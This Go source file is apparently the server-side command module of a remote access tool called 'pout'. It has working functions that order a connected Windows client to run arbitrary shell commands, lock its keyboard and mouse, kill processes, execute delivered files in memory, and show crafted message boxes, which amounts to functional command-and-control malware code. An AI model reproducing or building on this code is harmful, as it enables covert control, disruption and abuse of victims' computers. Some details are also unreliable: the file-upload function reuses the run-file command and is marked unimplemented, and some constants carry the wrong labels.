package server

import (
	"encoding/json"
	"fmt"

	"github.com/codeuk/pout/cmd/system"
)

// `Message` represents a Message exchanged between the server and the client.
type Message struct {
	Header  byte   `json:"packet_header"`
	Content []byte `json:"message_content"`
}

// `ClientFile` represents a file and its attributes that will be exchanged with the client.
type ClientFile struct {
	Name    string `json:"name"`
	Content []byte `json:"content"`
}

// `MessageBox` represents the information needed to display a message box using the Win32 API.
type MessageBox struct {
	Delay    int32   `json:"delay"`
	Amount   int32   `json:"amount"`
	Title    string  `json:"title"`
	Content  string  `json:"content"`
	Buttons  uintptr `json:"buttons,omitempty"`
	Icon     uintptr `json:"icon,omitempty"`
	Default  uintptr `json:"default,omitempty"`
	Modality uintptr `json:"modality,omitempty"`
}

// `Client.GetCommandOutput` sends a command to the client for it to execute.
func (c *Client) GetCommandOutput(command string) {
	// Send command for the client to execute and send back the output of.
	c.SendMessage(Message{
		Header:  HD_SHELL,
		Content: []byte(command),
	})
}

// `Client.ToggleInputLock` sends a command to the client that tells it to lock or unlock the keyboard and mouse.
func (c *Client) ToggleInputLock() {
	if c.InputLocked {
		// Send command to tell the client to allow all keyboard and mouse input.
		c.SendMessage(Message{Header: HD_INPUT_ON})
	} else {
		// Send command to tell the client to block all keyboard and mouse input.
		c.SendMessage(Message{Header: HD_INPUT_OFF})
	}
}

// `Client.GetProcesses` sends a sends a signal to the client for it to send back its running process list.
func (c *Client) GetProcesses() {
	// Send command to tell the client to send back the processes.
	c.SendMessage(Message{Header: HD_PROCESSES})
}

// `Client.KillProcessByID` sends a signal to the client to kill the passed process ID.
func (c *Client) KillProcessByID(pid string) {
	// Format the taskkill command to include the passed process ID.
	command := fmt.Sprintf("taskkill /f /pid %s", pid)

	// Send the taskkill command along with the process ID we want the client to kill.
	c.SendMessage(Message{
		Header:  HD_KILL_PROC,
		Content: []byte(command),
	})
}

// This feature has not yet been implemented.
//
// `Client.SendFile` sends a signal to the client and then the serialized JSON ClientFile for it to save.
func (c *Client) SendFile(file ClientFile) {
	// Serialize the ClientFile into JSON format
	fileBytes, _ := json.Marshal(file)

	// Send the upload command along with the file path we want the client to save.
	c.SendMessage(Message{
		Header:  HD_RUN_FILE,
		Content: fileBytes,
	})
}

// `Client.RunFile` sends a signal to the client and then the serialized JSON ClientFile for it to run in memory.
func (c *Client) RunFile(file ClientFile) {
	// Serialize the ClientFile into JSON format
	fileBytes, _ := json.Marshal(file)

	// Send the run command along with the file we want the client to execute.
	c.SendMessage(Message{
		Header:  HD_RUN_FILE,
		Content: fileBytes,
	})
}

// `Client.ReEstablishConnection` sends a signal to the client telling it to re-establish the connection.
func (c *Client) ReEstablishConnection() {
	// Send command to tell the client to disconnect from the server and reconnect back.
	c.SendMessage(Message{Header: HD_REMAKE})
}

// `Client.SendMessageBox` sends a signal to the client and then the serialized JSON MessageBox for it to display.
func (c *Client) SendMessageBox(messageBox MessageBox) {
	// Serialize the MessageBox into JSON format
	messageboxBytes, _ := json.Marshal(messageBox)

	// Send the msgbox command along with the MessageBox struct we want the client to display.
	c.SendMessage(Message{
		Header:  HD_MSG_BOX,
		Content: messageboxBytes,
	})
}

// Lists of the available MessageBox Icons and Buttons for selection.
var (
	IconListPtr   = []uintptr{MB_ICONNULL, MB_ICONERROR, MB_ICONQUESTION, MB_ICONWARNING, MB_ICONINFORMATION}
	ButtonListPtr = []uintptr{MB_OK, MB_OKCANCEL, MB_ABORTRETRYIGNORE, MB_YESNOCANCEL, MB_YESNO, MB_RETRYCANCEL, MB_CANCELTRYCONTINUE}
)

// `MessageBox.Show` displays formats and passes the current MessageBox values to the Win32MessageBox function.
// This is used for previewing the MessageBox that will be sent to the client on the server side.
func (msgbox *MessageBox) Show() int {
	return system.Win32MessageBox(0, msgbox.Content, msgbox.Title, msgbox.Buttons|msgbox.Icon|MB_TOPMOST)
}

// Win32 API MessageBoxW Button flags.
const (
	MB_OK                uintptr = 0x00000000
	MB_OKCANCEL          uintptr = 0x00000001
	MB_ABORTRETRYIGNORE  uintptr = 0x00000002
	MB_YESNOCANCEL       uintptr = 0x00000003
	MB_YESNO             uintptr = 0x00000004
	MB_RETRYCANCEL       uintptr = 0x00000005
	MB_CANCELTRYCONTINUE uintptr = 0x00000006
)

// Win32 API MessageBoxW Icon flags.
const (
	MB_ICONNULL        uintptr = 0x00000000
	MB_ICONERROR       uintptr = 0x00000010
	MB_ICONQUESTION    uintptr = 0x00000020
	MB_ICONWARNING     uintptr = 0x00000030
	MB_ICONINFORMATION uintptr = 0x00000040
)

// Win32 API MessageBoxW Alignment flags
const (
	MB_TOPMOST uintptr = 0x00040000
)

// Win32 API BlockInput flags.
const (
	ES_CONTINUOUS      uintptr = 0x80000000
	ES_SYSTEMREQUIRED  uintptr = 0x00000001
	ES_DISPLAYREQUIRED uintptr = 0x00000002
)
